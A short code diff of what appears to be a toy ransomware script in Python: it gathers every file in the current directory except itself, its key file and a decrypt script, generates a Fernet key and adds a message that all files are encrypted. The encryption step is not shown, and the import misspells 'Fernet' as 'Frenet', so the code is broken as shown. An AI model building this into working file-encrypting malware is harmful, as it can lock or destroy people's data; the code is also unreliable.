@@ -8,11 +8,12 @@ from cryptography.fernet import Frenet
 files = []
 
 for file in os.listdir():
-        if file == "voldimrt.py" or file == "thekey.key":
+        if file == "voldimrt.py" or file == "thekey.key" or file == "decrypt.py":
                 continue
         if os.path.isfile(file):
                 files.append(file)
 print(files)
+print("All files have been necrypted")
 
 key = Fernet.generate_key()
 
